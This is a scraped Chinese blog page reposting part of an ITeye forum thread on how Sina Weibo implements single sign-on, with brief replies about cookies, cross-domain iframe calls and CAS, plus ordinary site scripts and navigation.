<p>我怎么觉得没必要这么麻烦呢。
如果是我来做，直接通过cookie来判断用户是否为登录状态，然后在进行相关的URL跳转。
这种网站对于用户的安全性都不高，真有必要这么麻烦吗？
你不能因为用户禁用cookie就登陆不上去啊 <a href="http://www.iteye.com/topic/1039052#" target="_blank">返回顶楼</a> <a href="http://fangin.iteye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://fangin.iteye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://my.iteye.com/messages/new?message%5Breceiver_name%5D=fangin" title="发送站内短信" target="_blank"> </a> <a href="http://fangin.iteye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://my.iteye.com/feed?subscription%5Bsubscribed_user_name%5D=fangin" title="关注作者" target="_blank"> </a> <a href="http://www.iteye.com/topic/1039052#2096261" title="fangin回帖:新浪微博如何实现 SSO 的分析" target="_blank">回帖地址</a></p>
<p><a href="http://www.iteye.com/topic/1039052#" title="好" target="_blank">0</a> <a href="http://www.iteye.com/topic/1039052#" title="差" target="_blank">0</a> 请登录后投票  * denger</p>
<ul>
<li>等级: <img src="&quot;四星会员&quot;" alt="四星会员"></li>
<li><a href="http://denger.iteye.com/" target="_blank"><img src="&quot;denger的博客: Coding for fun.      &quot;" alt="denger的博客"></a></li>
<li>性别: <img src="&quot;男&quot;" alt=""></li>
<li>文章: 176</li>
<li>积分: 400</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2011-05-11   最后修改：2011-05-11</li>
</ul>
<p>fangin 写道</p>
<p>ln1058 写道</p>
<p>我怎么觉得没必要这么麻烦呢。
如果是我来做，直接通过cookie来判断用户是否为登录状态，然后在进行相关的URL跳转。
这种网站对于用户的安全性都不高，真有必要这么麻烦吗？
你不能因为用户禁用cookie就登陆不上去啊
你说的没错，不过遗憾的是 sina当你禁用了cookie你确实登录不上去。貌似连iteye也是这样。 <a href="http://www.iteye.com/topic/1039052#" target="_blank">返回顶楼</a> <a href="http://denger.iteye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://denger.iteye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://my.iteye.com/messages/new?message%5Breceiver_name%5D=denger" title="发送站内短信" target="_blank"> </a> <a href="http://denger.iteye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://my.iteye.com/feed?subscription%5Bsubscribed_user_name%5D=denger" title="关注作者" target="_blank"> </a> <a href="http://www.iteye.com/topic/1039052#2096274" title="denger回帖:新浪微博如何实现 SSO 的分析" target="_blank">回帖地址</a></p>
<p><a href="http://www.iteye.com/topic/1039052#" title="好" target="_blank">0</a> <a href="http://www.iteye.com/topic/1039052#" title="差" target="_blank">0</a> 请登录后投票  * aweber</p>
<ul>
<li>等级: 初级会员</li>
<li><a href="http://aweber.iteye.com/" target="_blank"><img src="&quot;aweber的博客: &quot;" alt="aweber的博客"></a></li>
<li>性别: <img src="&quot;男&quot;" alt=""></li>
<li>文章: 3</li>
<li>积分: 30</li>
<li>来自: 福建</li>
<li><img src="" alt="">
  发表时间：2011-05-11  </li>
</ul>
<p>亮点是 iframe调用父窗口js函数的解决方法。居然在当前域名下整了一个跳转页面，在跳转页面里面调用父窗口地址。NB。
我之前都是 在子iframe里面再包含一个iframe，简称孙iframe，孙iframe和父窗口同域名，也就是跳转页面，在孙iframe里面调用父窗口的函数 <a href="http://www.iteye.com/topic/1039052#" target="_blank">返回顶楼</a> <a href="http://aweber.iteye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://aweber.iteye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://my.iteye.com/messages/new?message%5Breceiver_name%5D=aweber" title="发送站内短信" target="_blank"> </a> <a href="http://aweber.iteye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://my.iteye.com/feed?subscription%5Bsubscribed_user_name%5D=aweber" title="关注作者" target="_blank"> </a> <a href="http://www.iteye.com/topic/1039052#2096367" title="aweber回帖:新浪微博如何实现 SSO 的分析" target="_blank">回帖地址</a></p>
<p><a href="http://www.iteye.com/topic/1039052#" title="好" target="_blank">0</a> <a href="http://www.iteye.com/topic/1039052#" title="差" target="_blank">0</a> 请登录后投票  * xiang37</p>
<ul>
<li>等级: 初级会员</li>
<li><a href="http://xiva.iteye.com/" target="_blank"><img src="&quot;xiang37的博客: 一步既出，无需罣碍，前行便是&quot;" alt="xiang37的博客"></a></li>
<li>性别: <img src="&quot;男&quot;" alt=""></li>
<li>文章: 22</li>
<li>积分: 40</li>
<li>来自: 南京</li>
<li><img src="" alt="">
  发表时间：2011-05-11  </li>
</ul>
<p>支持一个，最近在研究sso，现在想先做个cas的实例出来。 <a href="http://www.iteye.com/topic/1039052#" target="_blank">返回顶楼</a> <a href="http://xiva.iteye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://xiva.iteye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://my.iteye.com/messages/new?message%5Breceiver_name%5D=xiang37" title="发送站内短信" target="_blank"> </a> <a href="http://xiva.iteye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://my.iteye.com/feed?subscription%5Bsubscribed_user_name%5D=xiang37" title="关注作者" target="_blank"> </a> <a href="http://www.iteye.com/topic/1039052#2096404" title="xiang37回帖:新浪微博如何实现 SSO 的分析" target="_blank">回帖地址</a></p>
<p><a href="http://www.iteye.com/topic/1039052#" title="好" target="_blank">0</a> <a href="http://www.iteye.com/topic/1039052#" title="差" target="_blank">0</a> 请登录后投票  * tengfei3003</p>
<ul>
<li>等级: 初级会员</li>
<li><a href="http://tengfei3003.iteye.com/" target="_blank"><img src="&quot;tengfei3003的博客: tengfei3003&quot;" alt="tengfei3003的博客"></a></li>
<li>性别: <img src="&quot;男&quot;" alt=""></li>
<li>文章: 9</li>
<li>积分: 40</li>
<li>来自: 南京</li>
<li><img src="" alt="">
  发表时间：2011-05-11  </li>
</ul>
<p>分析透彻，好好研究研究 <a href="http://www.iteye.com/topic/1039052#" target="_blank">返回顶楼</a> <a href="http://tengfei3003.iteye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://tengfei3003.iteye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://my.iteye.com/messages/new?message%5Breceiver_name%5D=tengfei3003" title="发送站内短信" target="_blank"> </a> <a href="http://tengfei3003.iteye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://my.iteye.com/feed?subscription%5Bsubscribed_user_name%5D=tengfei3003" title="关注作者" target="_blank"> </a> <a href="http://www.iteye.com/topic/1039052#2096616" title="tengfei3003回帖:新浪微博如何实现 SSO 的分析" target="_blank">回帖地址</a></p>
<p><a href="http://www.iteye.com/topic/1039052#" title="好" target="_blank">0</a> <a href="http://www.iteye.com/topic/1039052#" title="差" target="_blank">0</a> 请登录后投票  * jeho0815</p>
<ul>
<li>等级: 初级会员</li>
<li><a href="http://jeho0815.iteye.com/" target="_blank"><img src="&quot;jeho0815的博客: &quot;" alt="jeho0815的博客"></a></li>
<li>性别: <img src="&quot;男&quot;" alt=""></li>
<li>文章: 21</li>
<li>积分: 30</li>
<li>来自: 深圳</li>
<li><img src="" alt="">
  发表时间：2011-05-11  </li>
</ul>
<p>看的有点困难啊，实力太差了！ <a href="http://www.iteye.com/topic/1039052#" target="_blank">返回顶楼</a> <a href="http://jeho0815.iteye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://jeho0815.iteye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://my.iteye.com/messages/new?message%5Breceiver_name%5D=jeho0815" title="发送站内短信" target="_blank"> </a> <a href="http://jeho0815.iteye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://my.iteye.com/feed?subscription%5Bsubscribed_user_name%5D=jeho0815" title="关注作者" target="_blank"> </a> <a href="http://www.iteye.com/topic/1039052#2097028" title="jeho0815回帖:新浪微博如何实现 SSO 的分析" target="_blank">回帖地址</a></p>
<p><a href="http://www.iteye.com/topic/1039052#" title="好" target="_blank">0</a> <a href="http://www.iteye.com/topic/1039052#" title="差" target="_blank">0</a> 请登录后投票</p>
<p>« 上一页 1 <a href="http://www.iteye.com/topic/1039052?page=2" target="_blank">2</a> <a href="http://www.iteye.com/topic/1039052?page=3" target="_blank">3</a> <a href="http://www.iteye.com/topic/1039052?page=2" target="_blank">下一页 »</a>
<a href="http://www.iteye.com/forums" target="_blank">论坛首页</a> → <a href="http://www.iteye.com/forums/board/Java" target="_blank">Java企业应用版</a>
跳转论坛:移动开发技术 Web前端技术 Java企业应用 编程语言技术 综合技术 入门技术 招聘求职 海阔天空</p>
<ul>
<li><a href="http://www.iteye.com/jobs/2137" title="吉林:用友汽车软件诚聘高级Java工程师工作地点：长春、北京" target="_blank">吉林: 用友汽车软件诚聘高级Java工程师工作地点：长</a></li>
<li><a href="http://www.iteye.com/jobs/2144" title="广东:用友汽车软件诚聘中级JAVA工程师 工作地点：广州" target="_blank">广东: 用友汽车软件诚聘中级JAVA工程师 工作地点：</a></li>
<li><a href="http://www.iteye.com/jobs/2343" title="上海:宝尊电商诚聘JAVA中级软件工程师" target="_blank">上海: 宝尊电商诚聘JAVA中级软件工程师</a></li>
<li><a href="http://www.iteye.com/jobs/2426" title="北京:都乐保诚聘Java高级开发工程师" target="_blank">北京: 都乐保诚聘Java高级开发工程师</a></li>
<li><a href="http://www.iteye.com/jobs/1144" title="陕西:ThoughtWorks诚聘西安Senior Java Application Developer" target="_blank">陕西: ThoughtWorks诚聘西安Senior Java Applicatio</a></li>
<li><a href="http://www.iteye.com/jobs/2078" title="上海:用友汽车软件诚聘项目经理" target="_blank">上海: 用友汽车软件诚聘项目经理</a></li>
<li><a href="http://www.iteye.com/jobs/2106" title="上海:爱可生技术诚聘高级JAVA工程师" target="_blank">上海: 爱可生技术诚聘高级JAVA工程师</a></li>
<li><a href="http://www.iteye.com/jobs/2141" title="上海:用友汽车软件诚聘初级java开发工程师（UAP平台）" target="_blank">上海: 用友汽车软件诚聘初级java开发工程师（UAP平</a></li>
<li><a href="http://www.iteye.com/jobs/2344" title="上海:宝尊电商诚聘JAVA高级软件工程师" target="_blank">上海: 宝尊电商诚聘JAVA高级软件工程师</a></li>
<li><a href="http://www.iteye.com/jobs/1628" title="浙江:阿里巴巴诚聘高级Java工程师" target="_blank">浙江: 阿里巴巴诚聘高级Java工程师</a></li>
<li><a href="http://www.iteye.com/jobs/1849" title="浙江:阿里巴巴诚聘C++开发工程师(搜索引擎和广告引擎方向，偏底层)" target="_blank">浙江: 阿里巴巴诚聘C++开发工程师(搜索引擎和广告</a></li>
<li><a href="http://www.iteye.com/jobs/2136" title="吉林:用友汽车软件诚聘java开发工程师 工作地点：长春、北京" target="_blank">吉林: 用友汽车软件诚聘java开发工程师 工作地点：</a></li>
<li><a href="http://www.iteye.com/jobs/2143" title="上海:用友汽车软件诚聘中级java程序员（工作地点：上海安亭）" target="_blank">上海: 用友汽车软件诚聘中级java程序员（工作地点：</a></li>
<li><a href="http://www.iteye.com/jobs/2064" title="上海:用友汽车软件诚聘高级Java程序员" target="_blank">上海: 用友汽车软件诚聘高级Java程序员</a></li>
<li><a href="http://www.iteye.com/jobs/2427" title="北京:都乐保诚聘Java开发工程师" target="_blank">北京: 都乐保诚聘Java开发工程师</a></li>
<li><a href="http://www.iteye.com/jobs/2321" title="云南:云南远信诚聘高级软件工程师(J2EE) " target="_blank">云南: 云南远信诚聘高级软件工程师(J2EE)</a></li>
<li><a href="http://www.iteye.com/jobs/2140" title="上海:用友汽车软件诚聘高级java开发工程师（UAP平台）" target="_blank">上海: 用友汽车软件诚聘高级java开发工程师（UAP平</a></li>
<li><a href="http://www.iteye.com/jobs/2437" title="广东:★路人甲★诚聘高级Java程序员 广州" target="_blank">广东: ★路人甲★诚聘高级Java程序员 广州</a></li>
<li><a href="http://www.iteye.com/jobs/2297" title="云南:云南远信诚聘软件工程师（Java）" target="_blank">云南: 云南远信诚聘软件工程师（Java）</a></li>
<li><p><a href="http://www.iteye.com/jobs/2358" title="浙江:全麦电子商务诚聘J2EE系统架构师" target="_blank">浙江: 全麦电子商务诚聘J2EE系统架构师</a></p>
</li>
<li><p><a href="http://www.iteye.com/" target="_blank">首页</a></p>
</li>
<li><a href="http://www.iteye.com/news" target="_blank">资讯</a></li>
<li><a href="http://www.iteye.com/magazines" target="_blank">精华</a></li>
<li><a href="http://www.iteye.com/forums" target="_blank">论坛</a></li>
<li><a href="http://www.iteye.com/ask" target="_blank">问答</a></li>
<li><a href="http://www.iteye.com/blogs" target="_blank">博客</a></li>
<li><a href="http://www.iteye.com/blogs/subjects" target="_blank">专栏</a></li>
<li><a href="http://www.iteye.com/groups" target="_blank">群组</a></li>
<li><a href="http://www.iteye.com/job" target="_blank">招聘</a></li>
<li><a href="http://www.iteye.com/search" target="_blank">搜索</a></li>
<li><a href="http://www.iteye.com/index/service" target="_blank">广告服务</a></li>
<li><a href="http://webmaster.iteye.com/" target="_blank">ITeye黑板报</a></li>
<li><a href="http://www.iteye.com/index/contactus" target="_blank">联系我们</a></li>
<li><a href="http://www.iteye.com/index/friend_links" target="_blank">友情链接</a></li>
</ul>
<p>© 2003-2012 ITeye.com. [ <a href="http://www.miibeian.gov.cn/" target="_blank">京ICP证110151号</a> 京公网安备110105010620 ]
百联优力(北京)投资有限公司 版权所有 <img src="" alt=""></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/CAS/">CAS</a></li></span></span> | <span class="tags">Tagged <a href="/tags/CAS/" class="label label-primary">CAS</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-CAS--新浪微博如何实现SSO的分析-企业应用-Java-ITeye论坛/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-CAS--新浪微博如何实现SSO的分析-企业应用-Java-ITeye论坛" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/88/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/86/">86</a></li><li><a class="page-number" href="/page/87/">87</a></li><li><a class="page-number" href="/page/88/">88</a></li><li class="active"><li><span class="page-number current">89</span></li><li><a class="page-number" href="/page/90/">90</a></li><li><a class="page-number" href="/page/91/">91</a></li><li><a class="page-number" href="/page/92/">92</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/164/">164</a></li><li><a class="page-number" href="/page/165/">165</a></li><li><a class="extend next" href="/page/90/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>正在加载...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">最近更新</div>  <div data-src='latest_update_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Blog powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a> Theme <strong><a href='https://github.com/chenall/hexo-theme-chenall'>chenall</a></strong>(Some change in it)<span class="pull-right"> 更新时间: <em>2014-03-15 20:45:44</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
